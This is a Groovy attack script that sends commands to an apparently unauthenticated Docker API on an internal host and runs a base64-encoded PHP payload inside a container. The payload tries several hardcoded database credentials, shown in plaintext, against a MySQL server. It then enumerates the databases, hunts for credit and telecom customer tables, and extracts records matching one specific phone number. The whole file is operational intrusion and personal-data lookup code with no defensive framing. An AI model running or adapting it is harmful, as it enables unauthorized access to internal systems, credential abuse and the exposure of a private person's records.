import groovy.json.JsonSlurper
import groovy.json.JsonOutput

def dHost = "172.27.140.148"
def dPort = 4243
def cid = "5b32e909c295"

// Try DEV MySQL 172.27.140.151 - search for credito tables
def phpB64 = java.util.Base64.encoder.encodeToString('''<?php
// Try DEV MySQL
$c=new mysqli("172.27.140.151","csadmin","K7B]y6t8uvIR)k2s","",3306);
if($c->connect_error){
    echo "csadmin FAIL:".$c->connect_error."\n";
    // Try other known creds
    $c=new mysqli("172.27.140.151","adaxxidb","JTQ6PrkecY3y1kVN","",3306);
    if($c->connect_error){
        echo "adaxxidb FAIL:".$c->connect_error."\n";
        // try root
        $c=new mysqli("172.27.140.151","root","",""  ,3306);
        if($c->connect_error){die("ALL_FAIL:".$c->connect_error);}
    }
}
echo "CONNECTED as: ".$c->query("SELECT CURRENT_USER()")->fetch_row()[0]."\n";

// List databases
$r=$c->query("SHOW DATABASES");
echo "=== DATABASES ===\n";
$dbs=[];
while($row=$r->fetch_row()){echo $row[0]."\n";$dbs[]=$row[0];}

// Search for credito tables
echo "\n=== credito/telmex TABLES ===\n";
$r2=$c->query("SELECT TABLE_SCHEMA,TABLE_NAME FROM information_schema.TABLES WHERE TABLE_NAME LIKE '%credito%' OR TABLE_NAME LIKE '%clarotel%' OR TABLE_NAME LIKE '%telmex%' OR TABLE_NAME LIKE '%linea%cred%'");
if($r2 && $r2->num_rows>0){
    while($row=$r2->fetch_row()){echo "$row[0].$row[1]\n";}
}else{echo "NONE\n";}

// If tables found, query for phone
echo "\n=== SEARCH 5558455777 ===\n";
foreach($dbs as $db){
    $r3=$c->query("SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='$db' AND (TABLE_NAME LIKE '%credito%clarotel%' OR TABLE_NAME LIKE '%credcliente%' OR TABLE_NAME LIKE '%lineac%')");
    if($r3 && $r3->num_rows>0){
        while($t=$r3->fetch_row()){
            $tbl="$db.".$t[0];
            echo "Found: $tbl\n";
            // Check if telefono column exists
            $cols=$c->query("SHOW COLUMNS FROM $tbl LIKE 'telefono'");
            if($cols && $cols->num_rows>0){
                $data=$c->query("SELECT * FROM $tbl WHERE telefono LIKE '%5558455777%' LIMIT 5");
                if($data && $data->num_rows>0){
                    $fields=$data->fetch_fields();
                    $hdr=[];foreach($fields as $f)$hdr[]=$f->name;
                    echo implode("|",$hdr)."\n";
                    while($row=$data->fetch_row()){echo implode("|",$row)."\n";}
                }else{echo "  no match for phone\n";}
            }
        }
    }
}
$c->close();
?>'''.getBytes("UTF-8"))

def url1 = new URL("http://${dHost}:${dPort}/containers/${cid}/exec")
def c1 = url1.openConnection()
c1.setRequestMethod("POST")
c1.setDoOutput(true)
c1.setRequestProperty("Content-Type", "application/json")
c1.setConnectTimeout(5000)
c1.setReadTimeout(20000)
def b1 = JsonOutput.toJson([AttachStdout: true, AttachStderr: true, Cmd: ["bash", "-c", "echo ${phpB64} | base64 -d > /tmp/tq3.php && php /tmp/tq3.php"]])
c1.outputStream.write(b1.bytes)
c1.outputStream.flush()
def r1 = new JsonSlurper().parseText(c1.inputStream.text)
def eid1 = r1.Id

def su1 = new URL("http://${dHost}:${dPort}/exec/${eid1}/start")
def sc1 = su1.openConnection()
sc1.setRequestMethod("POST")
sc1.setDoOutput(true)
sc1.setRequestProperty("Content-Type", "application/json")
sc1.setConnectTimeout(5000)
sc1.setReadTimeout(30000)
sc1.outputStream.write('{"Detach":false,"Tty":true}'.bytes)
sc1.outputStream.flush()
println sc1.inputStream.text
